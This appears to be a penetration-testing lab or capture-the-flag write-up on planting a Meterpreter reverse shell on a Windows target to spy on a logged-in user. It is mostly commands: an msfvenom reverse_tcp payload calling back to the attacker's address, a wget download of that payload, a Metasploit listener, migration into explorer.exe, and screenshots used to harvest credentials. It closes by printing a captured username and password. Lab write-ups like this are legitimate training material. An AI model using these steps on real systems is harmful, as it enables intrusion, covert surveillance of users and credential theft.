
If an user has an active session on the target we are in right now, we can sniff on him.

Let's get an meterpreter shell in order to sniff on the user and to screenshot what he is doing!

1. Creating payload.

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.57 LPORT=9002 -f exe -o met.exe
```

2. Started up metasploit

```
msfdb run
```

3. Transfered payload onto the target server.

```
wget http://10.10.14.57/met.exe -o met.exe
```

4. Started up metasploit listener

```
use /exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 9002
exploit -j
```

5. Executed payload on target

```
.\met.exe
```

Gained Meterpreter Session

```
sessions
sessions 1
```

6. Enumerate Processes and search for explorer

```
ps
```

7. Migrate to the Explorer PID

```
migrate 1308
```

8. Now we can screenshot.

```
screenshot
```

OR 

```
screenshare
```

I screenshotted a couple of times and gained new credentials for user "imonks". Apparently the current user was creating an ps credential object to get another ps-session to "atsserver" and we screenshotted the process! 

```
imonks:W3_4R3_th3_f0rce.
```